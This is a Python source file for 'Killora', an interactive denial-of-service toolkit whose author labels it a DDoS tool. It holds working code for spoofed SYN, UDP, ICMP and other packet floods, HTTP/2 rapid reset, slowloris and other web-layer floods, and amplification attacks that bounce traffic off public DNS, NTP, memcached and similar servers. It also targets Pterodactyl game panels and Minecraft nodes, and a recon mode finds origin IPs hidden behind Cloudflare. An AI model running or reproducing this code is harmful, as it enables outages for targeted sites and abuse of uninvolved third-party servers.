#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Killora - multi-vector stress / DDoS toolkit
made by BrokenCodeZ
"""
import asyncio, contextlib, json, os, random, re, socket, ssl, struct, string
import subprocess, sys, time, ipaddress

VERSION = "2.4.0"
MAX_FLOOD = 1_000_000_000
AUTHOR = "BrokenCodeZ"

C = dict(r="\033[0m", g="\033[1;32m", y="\033[1;33m", c="\033[1;36m",
         rd="\033[1;31m", b="\033[1;34m", m="\033[1;35m", d="\033[2m", w="\033[1;37m")

def col(k, s): return f"{C.get(k,'')}{s}{C['r']}"
def clear(): os.system("clear" if os.name != "nt" else "cls")
def say(s): print(f"{col('c','[*]')} {s}")
def ok(s): print(f"{col('g','[+]')} {s}")
def bad(s): print(f"{col('rd','[x]')} {s}")
def warn(s): print(f"{col('y','[!]')} {s}")

BANNER = r"""
  ██╗  ██╗██╗██╗     ██╗      ██████╗ ██████╗  █████╗
  ██║ ██╔╝██║██║     ██║     ██╔═══██╗██╔══██╗██╔══██╗
  █████╔╝ ██║██║     ██║     ██║   ██║██████╔╝███████║
  ██╔═██╗ ██║██║     ██║     ██║   ██║██╔══██╗██╔══██║
  ██║  ██╗██║███████╗███████╗╚██████╔╝██║  ██║██║  ██║
  ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝"""

# ─────────────────────────── net helpers ────────────────────────────
CF_V4 = ["173.245.48.0/20","103.21.244.0/22","103.22.200.0/22","103.31.4.0/22",
         "141.101.64.0/18","108.162.192.0/18","190.93.240.0/20","188.114.96.0/20",
         "197.234.240.0/22","198.41.128.0/17","162.158.0.0/15","104.16.0.0/13",
         "104.24.0.0/14","172.64.0.0/13","131.0.72.0/22"]
_CF_NETS = [ipaddress.ip_network(n) for n in CF_V4]

def is_cf(ip: str) -> bool:
    try: a = ipaddress.ip_address(ip)
    except ValueError: return False
    return any(a in n for n in _CF_NETS)

def resolve(host: str, port: int = 80):
    try:
        ipaddress.ip_address(host); return host, []
    except ValueError: pass
    try:
        infos = socket.getaddrinfo(host, port, socket.AF_INET, socket.SOCK_STREAM)
    except socket.gaierror:
        return None, []
    ips = sorted({i[4][0] for i in infos})
    return (ips[0] if ips else None), ips

SUBS = ["direct","origin","origin-www","ftp","mail","webmail","cpanel","whm","dev",
        "staging","stage","test","beta","vpn","ssh","sftp","api","admin","portal",
        "panel","node","nodes","wings","daemon","mc","game","db","mysql","sql",
        "backend","internal","intranet","assets","static","media","cdn2","old","new"]

def origin_scan(domain: str):
    """Cloudflare ke peeche origin IP dhoondta hai."""
    found = set()
    say(f"origin discovery: {domain}")
    for s in SUBS:
        try:
            for fam, _, _, _, sa in socket.getaddrinfo(f"{s}.{domain}", None, socket.AF_INET):
                ip = sa[0]
                if not is_cf(ip): found.add(ip)
        except socket.gaierror: pass
    for url in (f"https://crt.sh/?q=%25.{domain}&output=json",
                f"https://api.hackertarget.com/hostsearch/?q={domain}"):
        try:
            import urllib.request
            raw = urllib.request.urlopen(url, timeout=12).read().decode("utf8", "ignore")
            for m in re.findall(r"\b(?:\d{1,3}\.){3}\d{1,3}\b", raw):
                if not is_cf(m) and not m.startswith(("10.","127.","0.")): found.add(m)
        except Exception: pass
    return sorted(found)

# ─────────────────────────── packet craft ───────────────────────────
def csum(data: bytes) -> int:
    if len(data) % 2: data += b"\x00"
    s = sum(struct.unpack(f"!{len(data)//2}H", data))
    s = (s >> 16) + (s & 0xFFFF); s += s >> 16
    return ~s & 0xFFFF

def ip_hdr(src, dst, proto, plen):
    return struct.pack("!BBHHHBBH4s4s", 0x45, 0, 20 + plen, random.randint(0, 65535),
                       0, random.randint(64, 255), proto, 0,
                       socket.inet_aton(src), socket.inet_aton(dst))

def ip_build(src, dst, proto, payload):
    h = ip_hdr(src, dst, proto, len(payload))
    h = h[:10] + struct.pack("!H", csum(h)) + h[12:]
    return h + payload

def tcp_build(src, dst, sport, dport, seq, ack, flags, payload=b"", win=64240):
    off = (5 << 4)
    seg = struct.pack("!HHIIBBHHH", sport, dport, seq, ack, off, flags, win, 0, 0)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 6, len(seg) + len(payload))
    chk = csum(pseudo + seg + payload)
    seg = seg[:16] + struct.pack("!H", chk) + seg[18:]
    return seg + payload

def udp_build(src, dst, sport, dport, payload):
    ln = 8 + len(payload)
    hdr = struct.pack("!HHHH", sport, dport, ln, 0)
    pseudo = socket.inet_aton(src) + socket.inet_aton(dst) + struct.pack("!BBH", 0, 17, ln)
    chk = csum(pseudo + hdr + payload) or 0xFFFF
    hdr = struct.pack("!HHHH", sport, dport, ln, chk)
    return hdr + payload

def raw_sock():
    s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    return s

def rnd_ip():
    return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def rnd_str(n=8):
    return "".join(random.choice(string.ascii_letters + string.digits) for _ in range(n))

UAS = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Safari/537.36",
       "Mozilla/5.0 (X11; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0",
       "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
       "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
       "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0 Mobile Safari/537.36",
       "curl/8.5.0", "python-requests/2.32.0", "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"]

def hdrs(host, extra=None, spoof=True):
    h = {"Host": host, "User-Agent": random.choice(UAS),
         "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": random.choice(["en-US,en;q=0.9","hi-IN,hi;q=0.9","ru-RU,ru;q=0.8","de-DE,de;q=0.8"]),
         "Accept-Encoding": "gzip, deflate, br", "Connection": random.choice(["keep-alive","close"]),
         "Cache-Control": "no-cache, no-store", "Pragma": "no-cache",
         "Upgrade-Insecure-Requests": "1"}
    if spoof:
        h["X-Forwarded-For"] = rnd_ip()
        h["X-Real-IP"] = rnd_ip()
        h["CF-Connecting-IP"] = rnd_ip()
        h["True-Client-IP"] = rnd_ip()
    if extra: h.update(extra)
    return h

# ─────────────────────────── stats ───────────────────────────
class Stats:
    def __init__(self): self.sent = 0; self.err = 0; self.byt = 0; self.t0 = time.time(); self.stop = False
    def hit(self, b=0): self.sent += 1; self.byt += b
    def miss(self): self.err += 1
    def rate(self): return self.sent / max(time.time() - self.t0, 0.001)

async def reporter(st: Stats):
    while not st.stop:
        await asyncio.sleep(1)
        r = st.rate()
        sys.stdout.write(f"\r{col('d','  ──')} sent {col('g',f'{st.sent:,}')}  "
                         f"pps {col('y',f'{r:,.0f}')}  err {col('rd',st.err)}  "
                         f"data {col('c',f'{st.byt/1048576:.1f} MB')} ")
        sys.stdout.flush()
    print()

# ─────────────────────────── L4 attacks ───────────────────────────
async def atk_udp(ip, port, st, ctx):
    s = ctx["udp"]
    pl = os.urandom(random.randint(64, 1400))
    s.sendto(pl, (ip, port)); st.hit(len(pl))

async def atk_udp_spoof(ip, port, st, ctx):
    s = ctx["raw"]
    pl = os.urandom(random.randint(512, 1400))
    pkt = ip_build(rnd_ip(), ip, 17, udp_build(rnd_ip(), ip, random.randint(1024, 65535), port, pl))
    s.sendto(pkt, (ip, 0)); st.hit(len(pkt))

async def atk_syn(ip, port, st, ctx):
    s = ctx["raw"]
    src = rnd_ip()
    pkt = ip_build(src, ip, 6, tcp_build(src, ip, random.randint(1024, 65535), port,
                                        random.randint(0, 2**32-1), 0, 0x02))
    s.sendto(pkt, (ip, 0)); st.hit(len(pkt))

async def atk_ack(ip, port, st, ctx):
    s = ctx["raw"]
    src = rnd_ip()
    pkt = ip_build(src, ip, 6, tcp_build(src, ip, random.randint(1024, 65535), port,
                                        random.randint(0, 2**32-1), random.randint(0, 2**32-1), 0x10))
    s.sendto(pkt, (ip, 0)); st.hit(len(pkt))

async def atk_rst(ip, port, st, ctx):
    s = ctx["raw"]
    src = rnd_ip()
    pkt = ip_build(src, ip, 6, tcp_build(src, ip, random.randint(1024, 65535), port, 0, 0, 0x04))
    s.sendto(pkt, (ip, 0)); st.hit(len(pkt))

async def atk_psh(ip, port, st, ctx):
    s = ctx["raw"]
    src = rnd_ip()
    pl = os.urandom(random.randint(16, 256))
    pkt = ip_build(src, ip, 6, tcp_build(src, ip, random.randint(1024, 65535), port,
                                        random.randint(0, 2**32-1), 1, 0x18, pl))
    s.sendto(pkt, (ip, 0)); st.hit(len(pkt))

async def atk_xmas(ip, port, st, ctx):
    s = ctx["raw"]
    src = rnd_ip()
    pkt = ip_build(src, ip, 6, tcp_build(src, ip, random.randint(1024, 65535), port, 0, 0, 0x29))
    s.sendto(pkt, (ip, 0)); st.hit(len(pkt))

async def atk_connect(ip, port, st, ctx):
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), 5)
        w.write(b"GET / HTTP/1.1\r\nHost: x\r\n\r\n")
        with contextlib.suppress(Exception): await w.drain()
        w.close(); st.hit()
    except Exception: st.miss()

async def atk_icmp(ip, port, st, ctx):
    s = ctx["raw"]
    pl = struct.pack("!BBHHH", 8, 0, 0, random.randint(0, 65535), 1) + os.urandom(32)
    pkt = ip_build(rnd_ip(), ip, 1, pl)
    s.sendto(pkt, (ip, 0)); st.hit(len(pkt))

# ─────────────────────────── L7 attacks ───────────────────────────
async def _http_req(ip, port, st, ctx, method="GET", path=None, extra=None, host=None):
    import aiohttp
    url = f"http://{host or ip}:{port}{path or '/'}"
    try:
        async with ctx["session"].request(method, url, headers=hdrs(host or ip, extra),
                                          ssl=False, timeout=aiohttp.ClientTimeout(total=10)) as r:
            await r.read(); st.hit()
    except Exception: st.miss()

async def atk_http_get(ip, port, st, ctx):
    p = f"/?{rnd_str(10)}={rnd_str(14)}&cb={random.randint(1,999999)}"
    await _http_req(ip, port, st, ctx, "GET", p)

async def atk_http_post(ip, port, st, ctx):
    await _http_req(ip, port, st, ctx, "POST", f"/?{rnd_str(8)}",
                    {"Content-Type": "application/x-www-form-urlencoded"})

async def atk_cache(ip, port, st, ctx):
    p = f"/{rnd_str(6)}/{rnd_str(10)}.js?{rnd_str(16)}"
    await _http_req(ip, port, st, ctx, "GET", p, {"Cache-Control": "no-cache", "Pragma": "no-cache"})

async def atk_api(ip, port, st, ctx):
    p = random.choice(["/api/v1/status", "/api/system", "/graphql", "/api/users", "/api/nodes"])
    await _http_req(ip, port, st, ctx, "GET", p, {"Accept": "application/json"})

async def atk_tls(ip, port, st, ctx):
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port, ssl=ctx["ssl"]), 6)
        w.close(); st.hit()
    except Exception: st.miss()

async def atk_slowloris(ip, port, st, ctx):
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), 6)
        w.write(f"GET /{rnd_str(6)} HTTP/1.1\r\nHost: {ip}\r\nUser-Agent: {random.choice(UAS)}\r\n".encode())
        for _ in range(random.randint(2, 6)):
            w.write(f"X-a{rnd_str(4)}: {rnd_str(20)}\r\n".encode())
            await w.drain(); await asyncio.sleep(random.uniform(0.4, 1.6))
        st.hit()
        if random.random() < 0.25: w.close()
        else: ctx["hold"].append(w)
    except Exception: st.miss()

async def atk_rudy(ip, port, st, ctx):
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), 6)
        w.write(f"POST /{rnd_str(6)} HTTP/1.1\r\nHost: {ip}\r\nContent-Length: 999999\r\n"
                f"Content-Type: application/x-www-form-urlencoded\r\n\r\n".encode())
        for _ in range(random.randint(1, 4)):
            w.write(f"a={rnd_str(32)}&".encode()); await w.drain()
            await asyncio.sleep(random.uniform(0.5, 1.8))
        st.hit(); ctx["hold"].append(w)
    except Exception: st.miss()

async def atk_ws(ip, port, st, ctx):
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), 6)
        k = rnd_str(22)
        w.write((f"GET / HTTP/1.1\r\nHost: {ip}\r\nUpgrade: websocket\r\nConnection: Upgrade\r\n"
                 f"Sec-WebSocket-Key: {k}==\r\nSec-WebSocket-Version: 13\r\n"
                 f"User-Agent: {random.choice(UAS)}\r\n\r\n").encode())
        await w.drain(); st.hit(); ctx["hold"].append(w)
    except Exception: st.miss()

async def atk_h2(ip, port, st, ctx):
    try:
        import h2.connection, h2.config, h2.events
    except ImportError:
        return await atk_tls(ip, port, st, ctx)
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port, ssl=ctx["ssl_h2"]), 6)
        cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
        c = h2.connection.H2Connection(config=cfg)
        c.initiate_connection(); w.write(c.data_to_send()); await w.drain()
        async def drain():
            with contextlib.suppress(Exception):
                while True:
                    d = await asyncio.wait_for(r.read(65536), 0.05)
                    if not d: break
                    c.receive_data(d); w.write(c.data_to_send()); await w.drain()
        t = asyncio.create_task(drain())
        for _ in range(random.randint(20, 60)):
            sid = c.get_next_available_stream_id()
            c.send_headers(sid, [(":method", "GET"), (":path", f"/{rnd_str(8)}"),
                                 (":scheme", "https"), (":authority", ip),
                                 ("user-agent", random.choice(UAS))], end_stream=True)
            w.write(c.data_to_send()); await w.drain()
            c.reset_stream(sid)
            w.write(c.data_to_send()); await w.drain(); st.hit()
        t.cancel(); w.close()
    except Exception: st.miss()

# ─────────────────────────── amplification ───────────────────────────
DNS_SERVERS = ["8.8.8.8","1.1.1.1","9.9.9.9","208.67.222.222","64.6.64.6","77.88.8.8",
               "156.154.70.1","84.200.69.80","8.26.56.26","199.85.126.10"]
NTP_SERVERS = ["162.159.200.1","216.239.35.0","129.6.15.28","132.163.96.1","120.88.76.2"]
MEMCACHED = ["1.2.3.4"]  # public list se replace karo

def _amp(ctx, st, target, payload_fn, servers, proto):
    s = ctx["raw"]
    dst = random.choice(servers)
    sport = random.randint(1024, 65535)
    payload, dport = payload_fn()
    pkt = ip_build(target, dst, proto, udp_build(target, dst, sport, dport, payload))
    s.sendto(pkt, (dst, 0)); st.hit(len(pkt))

async def atk_dns(ip, port, st, ctx):
    q = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + b"\x08killora\x03com\x00" + b"\x00\xff\x00\x01"
    _amp(ctx, st, ip, lambda: (q, 53), DNS_SERVERS, 17)

async def atk_ntp(ip, port, st, ctx):
    _amp(ctx, st, ip, lambda: (b"\x17\x00\x03\x2a" + b"\x00"*4, 123), NTP_SERVERS, 17)

async def atk_memcached(ip, port, st, ctx):
    _amp(ctx, st, ip, lambda: (b"\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n", 11211), MEMCACHED, 17)

async def atk_ssdp(ip, port, st, ctx):
    _amp(ctx, st, ip, lambda: (b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
                               b"MAN: \"ssdp:discover\"\r\nMX: 2\r\nST: ssdp:all\r\n\r\n", 1900),
         ["239.255.255.250"], 17)

async def atk_chargen(ip, port, st, ctx):
    _amp(ctx, st, ip, lambda: (os.urandom(1), 19),
         ["52.31.55.75","54.252.129.20","13.55.165.42"], 17)

async def atk_ldap(ip, port, st, ctx):
    q = bytes.fromhex("30840000002a020102638400000023040003") + b"ldap" + bytes.fromhex("a30a04020801")
    _amp(ctx, st, ip, lambda: (q, 389), ["1.1.1.1"], 17)

async def atk_snmp(ip, port, st, ctx):
    q = bytes.fromhex("302902010104067075626c6963a01c020400000001020100020100300e300c06082b060102010101000500")
    _amp(ctx, st, ip, lambda: (q, 161), ["192.168.1.1"], 17)

# ─────────────────────────── Pterodactyl ───────────────────────────
async def atk_ptero_panel(ip, port, st, ctx):
    p = random.choice(["/", "/auth/login", "/api/system", f"/assets/{rnd_str(8)}.js",
                       f"/?cb={random.randint(1,999999)}", "/auth/password"])
    await _http_req(ip, port, st, ctx, "GET", p, {"X-Requested-With": "XMLHttpRequest"})

async def atk_ptero_login(ip, port, st, ctx):
    import aiohttp
    try:
        data = {"user": f"{rnd_str(6)}@kill.ora", "password": rnd_str(12)}
        async with ctx["session"].post(f"http://{ip}:{port}/auth/login", data=data,
                                       headers=hdrs(ip, {"Content-Type": "application/x-www-form-urlencoded"}),
                                       ssl=False, allow_redirects=False,
                                       timeout=aiohttp.ClientTimeout(total=10)) as r:
            await r.read(); st.hit()
    except Exception: st.miss()

async def atk_ptero_wings(ip, port, st, ctx):
    p = random.choice(["/api/system", f"/api/servers/{rnd_str(8)}/ws", "/", "/api/backups"])
    await _http_req(ip, port, st, ctx, "GET", p,
                    {"X-Requested-With": "XMLHttpRequest", "Accept": "application/json"})

async def atk_node_kill(ip, port, st, ctx):
    """Minecraft / Java node handshake + status ping flood."""
    try:
        r, w = await asyncio.wait_for(asyncio.open_connection(ip, port), 6)
        host = ctx.get("host", ip).encode()
        hs = (b"\x00" + b"\x00" + bytes([len(host)]) + host +
              struct.pack("!H", port) + b"\x01")
        w.write(b"\x10" + hs + b"\x01\x00")
        await w.drain(); st.hit()
        await asyncio.sleep(random.uniform(0.05, 0.4)); w.close()
    except Exception: st.miss()

# ─────────────────────────── recon ───────────────────────────
def recon_cf(host):
    ip, ips = resolve(host)
    print()
    if not ip: return bad("resolve fail")
    ok(f"{host} -> {', '.join(ips)}")
    cf = [i for i in ips if is_cf(i)]
    if cf:
        bad(f"Cloudflare detected: {', '.join(cf)}")
        warn("origin scan chala rahe hain...")
        o = origin_scan(host)
        if o:
            ok("possible origin IPs:")
            for i in o: print(f"    {col('g',i)}")
            print(col('y', "  inhein direct attack karne se CF bypass ho jata hai (Host header ke saath)."))
        else: warn("origin nahi mila, CF-bypass mode fallback karega.")
    else: ok("Cloudflare nahi hai - direct IP attack possible.")

def recon_ports(host, ports=None):
    ip, _ = resolve(host)
    if not ip: return bad("resolve fail")
    ports = ports or [21,22,80,443,25565,8080,8443,3306,5432,6379,27017,19132]
    say(f"scan {ip}")
    for p in ports:
        s = socket.socket(); s.settimeout(1.2)
        t = time.time()
        try:
            s.connect((ip, p))
            try:
                s.send(b"\r\n"); banner = s.recv(64).decode("utf8","ignore").strip()
            except Exception: banner = ""
            ok(f"{p}/tcp open  {int((time.time()-t)*1000)}ms  {col('d',banner[:40])}")
        except Exception: pass
        finally: s.close()

def recon_http(host):
    import urllib.request
    for scheme in ("https", "http"):
        try:
            req = urllib.request.Request(f"{scheme}://{host}", headers={"User-Agent": random.choice(UAS)})
            with urllib.request.urlopen(req, timeout=10) as r:
                ok(f"{scheme} {r.status} {r.reason}")
                for k in ("Server","cf-ray","x-powered-by","via","x-cache","x-served-by"):
                    if r.headers.get(k): print(f"   {k}: {col('y', r.headers[k])}")
                return
        except Exception as e:
            warn(f"{scheme} fail: {e}")

# ─────────────────────────── engine ───────────────────────────
async def engine(func, host, port, flood, duration, threads, extra=None):
    ip, ips = resolve(host, port)
    if not ip: return bad("target resolve nahi hua")
    flood = max(1, min(int(flood), MAX_FLOOD))
    st = Stats()
    ctx = {"hold": [], "host": host, "session": None}
    if func in (atk_syn, atk_ack, atk_rst, atk_psh, atk_xmas, atk_icmp, atk_udp_spoof,
                atk_dns, atk_ntp, atk_memcached, atk_ssdp, atk_chargen, atk_ldap, atk_snmp):
        if os.geteuid() != 0: return bad("raw socket ke liye root chahiye (sudo -i)")
        ctx["raw"] = raw_sock()
    if func in (atk_udp,): ctx["udp"] = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    if func.__name__.startswith(("atk_http","atk_cache","atk_api","atk_ptero","atk_ws","atk_slow","atk_rudy","atk_node")):
        import aiohttp
        ctx["session"] = aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=0, force_close=False, ssl=False))
    if func in (atk_tls, atk_h2):
        ctx["ssl"] = ssl.create_default_context(); ctx["ssl"].check_hostname = False
        ctx["ssl"].verify_mode = ssl.CERT_NONE
        ctx["ssl"].set_ciphers("DEFAULT@SECLEVEL=1")
        ctx["ssl_h2"] = ctx["ssl"].copy() if hasattr(ctx["ssl"], "copy") else ctx["ssl"]
    ctx["ssl_h2"] = ctx.get("ssl")
    if "ssl_h2" in ctx and ctx["ssl_h2"]:
        with contextlib.suppress(Exception): ctx["ssl_h2"].set_alpn_protocols(["h2"])

    print()
    ok(f"target  : {host} ({ip}) :{port}")
    ok(f"vector  : {func.__name__[4:]}")
    ok(f"flood   : {flood:,}  threads: {threads}  duration: {duration}s")
    print(col('d', "  Ctrl+C se rok sakte ho."))

    deadline = time.time() + duration
    rtask = asyncio.create_task(reporter(st))

    async def worker():
        while time.time() < deadline and st.sent < flood and not st.stop:
            try: await func(ip, port, st, ctx)
            except Exception: st.miss()

    try:
        await asyncio.gather(*[worker() for _ in range(threads)])
    except (KeyboardInterrupt, asyncio.CancelledError): pass
    finally:
        st.stop = True; await asyncio.sleep(1.1); rtask.cancel()
        for w in ctx["hold"]:
            with contextlib.suppress(Exception): w.close()
        if ctx["session"]: await ctx["session"].close()
        for k in ("raw","udp"):
            if ctx.get(k):
                with contextlib.suppress(Exception): ctx[k].close()
        print()
        ok(f"done: {st.sent:,} packets  {st.byt/1048576:.1f} MB  avg {st.rate():,.0f} pps  err {st.err}")

# ─────────────────────────── menu data ───────────────────────────
MENU = [
    ("UDP Flood",                 "L4",  atk_udp,          80,     "plain UDP datagram flood"),
    ("UDP Spoofed Flood",         "L4",  atk_udp_spoof,    80,     "random source IP UDP"),
    ("TCP SYN Flood",             "L4",  atk_syn,          80,     "half-open handshake exhaustion"),
    ("TCP ACK Flood",             "L4",  atk_ack,          80,     "stateful firewall choke"),
    ("TCP RST Flood",             "L4",  atk_rst,          443,    "connection reset spam"),
    ("TCP PSH+ACK Flood",         "L4",  atk_psh,          80,     "data push flood"),
    ("TCP XMAS Flood",            "L4",  atk_xmas,         80,     "all flags set"),
    ("TCP Connect Flood",         "L4",  atk_connect,      80,     "full handshake flood"),
    ("ICMP Flood",                "L4",  atk_icmp,         0,      "ping flood"),
    ("HTTP GET Flood",            "L7",  atk_http_get,     80,     "random path + spoofed XFF"),
    ("HTTP POST Flood",           "L7",  atk_http_post,    80,     "form body flood"),
    ("Cache Bypass Flood",        "L7",  atk_cache,        80,     "static path + no-cache"),
    ("API / GraphQL Flood",       "L7",  atk_api,          80,     "api endpoint hammer"),
    ("HTTP/2 Rapid Reset",        "L7",  atk_h2,           443,    "h2 stream reset abuse"),
    ("TLS Handshake Flood",       "L7",  atk_tls,          443,    "ssl handshake exhaustion"),
    ("Slowloris",                 "L7",  atk_slowloris,    80,     "header drip hold"),
    ("Slow POST (RUDY)",          "L7",  atk_rudy,         80,     "body drip hold"),
    ("WebSocket Flood",           "L7",  atk_ws,           80,     "upgrade handshake spam"),
    ("DNS Amplification",         "AMP", atk_dns,          53,     "spoofed ANY query"),
    ("NTP Amplification",         "AMP", atk_ntp,          123,    "monlist style"),
    ("Memcached Amplification",   "AMP", atk_memcached,    11211,  "stats payload"),
    ("SSDP Amplification",        "AMP", atk_ssdp,         1900,   "M-SEARCH"),
    ("Chargen Amplification",     "AMP", atk_chargen,      19,     "udp echo"),
    ("LDAP Amplification",        "AMP", atk_ldap,         389,    "search query"),
    ("SNMP Amplification",        "AMP", atk_snmp,         161,    "getbulk"),
    ("Pterodactyl Panel Flood",   "PT",  atk_ptero_panel,  80,     "panel routes + api/system"),
    ("Pterodactyl Login Flood",   "PT",  atk_ptero_login,  80,     "auth/login POST spam"),
    ("Pterodactyl Wings Flood",   "PT",  atk_ptero_wings,  8080,   "wings daemon api"),
    ("Minecraft Node Kill",       "PT",  atk_node_kill,    25565,  "handshake + status ping"),
    ("Cloudflare Bypass Attack",  "BYP", None,             80,     "origin discovery + direct hit"),
    ("Multi-Vector (ALL)",        "BYP", None,             80,     "sabhi vectors ek saath"),
]

def menu():
    clear()
    print(col('m', BANNER))
    print(f"  {col('w','Killora')} {col('d','v'+VERSION)}   {col('d','made by '+AUTHOR)}")
    print(col('d', "  " + "─"*62))
    last = None
    for i, (name, layer, _, port, desc) in enumerate(MENU, 1):
        if layer != last:
            tag = {"L4":"layer 4 / network","L7":"layer 7 / application",
                   "AMP":"amplification / reflection","PT":"pterodactyl / game node",
                   "BYP":"bypass / multi"}[layer]
            print(f"\n  {col('c','['+layer+']')} {col('d',tag)}")
            last = layer
        print(f"  {col('y',f'{i:>2})')} {name:<26} {col('d',f'[{layer}]')}  {col('d',desc)}")
    print(f"\n  {col('rd',' 0)')} Exit")
    print(col('d', "  " + "─"*62))

def ask(prompt, default=None, cast=str, lo=None, hi=None):
    while True:
        v = input(f"{col('c','>')} {prompt}" + (f" {col('d','['+str(default)+']')}" if default else "") + ": ").strip()
        if not v and default is not None: return default
        try:
            v = cast(v)
            if lo is not None and v < lo: continue
            if hi is not None and v > hi: v = hi
            return v
        except Exception: warn("invalid value")

def ask_target():
    t = input(f"{col('c','>')} target (ip / domain): ").strip()
    if not t: return ask_target()
    return re.sub(r"^https?://", "", t).split("/")[0]

def tune_threads():
    n = os.cpu_count() or 2
    return max(64, n * 48)

def run_attack(idx):
    name, layer, func, dport, _ = MENU[idx]
    target = ask_target()

    if name == "Cloudflare Bypass Attack":
        port = ask("port", dport, int, 1, 65535)
        ip, ips = resolve(target, port)
        if not ip: return bad("resolve fail")
        origin = [i for i in origin_scan(target)] if any(is_cf(i) for i in ips) else []
        host_for_attack = origin[0] if origin else target
        if origin: ok(f"origin mil gaya: {origin[0]} - Host header preserve karke attack")
        else: warn("origin nahi mila - CF ke through attack")
        flood = ask("flood (max 1000000000)", 500000, int, 1, MAX_FLOOD)
        dur = ask("duration sec", 60, int, 5, 3600)
        th = ask("threads", tune_threads(), int, 1, 100000)
        asyncio.run(engine(atk_http_get if not origin else atk_syn, host_for_attack, port, flood, dur, th))
        return

    if name == "Multi-Vector (ALL)":
        port = ask("port", dport, int, 1, 65535)
        flood = ask("flood (max 1000000000)", 1000000, int, 1, MAX_FLOOD)
        dur = ask("duration sec", 90, int, 5, 3600)
        th = ask("threads per vector", 128, int, 1, 10000)
        vecs = [atk_udp_spoof, atk_syn, atk_ack, atk_http_get, atk_tls, atk_h2, atk_slowloris]
        async def all_at_once():
            await asyncio.gather(*[engine(v, target, port, flood // len(vecs), dur, th) for v in vecs])
        asyncio.run(all_at_once())
        return

    port = ask("port", dport, int, 1, 65535)
    flood = ask("flood (max 1000000000)", 200000, int, 1, MAX_FLOOD)
    dur = ask("duration sec", 60, int, 5, 3600)
    th = ask("threads", tune_threads(), int, 1, 100000)
    try: asyncio.run(engine(func, target, port, flood, dur, th))
    except KeyboardInterrupt: warn("stopped")

def recon_menu():
    clear(); print(col('m', "RECON"))
    print("  1) Cloudflare / WAF detect + origin finder\n  2) Port scan\n  3) HTTP fingerprint\n  0) back")
    c = input(col('c','> ')).strip()
    if c == "1": recon_cf(input("domain: ").strip())
    elif c == "2": recon_ports(input("host: ").strip())
    elif c == "3": recon_http(input("host: ").strip())
    input(col('d',"\nenter..."))

def sysinfo():
    clear(); print(col('m', "SYSTEM"))
    print(f"  cpu     : {os.cpu_count()} cores")
    print(f"  root    : {'yes' if os.geteuid()==0 else 'no'}")
    with contextlib.suppress(Exception):
        print(f"  ulimit  : {__import__('resource').getrlimit(__import__('resource').RLIMIT_NOFILE)[0]}")
    with contextlib.suppress(Exception):
        print(f"  mem     : {subprocess.check_output(['free','-m']).decode().splitlines()[1]}")
    print(col('d', "\n  tip: root + high ulimit = zyada pps"))
    input(col('d',"\nenter..."))

def main():
    if os.geteuid() == 0:
        with contextlib.suppress(Exception):
            import resource
            resource.setrlimit(resource.RLIMIT_NOFILE, (1048576, 1048576))
    while True:
        menu()
        try: c = input(f"\n{col('c','killora')} {col('d','>')} ").strip()
        except (EOFError, KeyboardInterrupt): print(); return
        if c == "0": return
        if c.upper() == "R": recon_menu(); continue
        if c.upper() == "S": sysinfo(); continue
        if not c.isdigit() or not (1 <= int(c) <= len(MENU)):
            warn("invalid option"); time.sleep(0.6); continue
        try: run_attack(int(c) - 1)
        except KeyboardInterrupt: warn("aborted")
        input(col('d', "\nenter for menu..."))

if __name__ == "__main__":
    with contextlib.suppress(KeyboardInterrupt):
        main()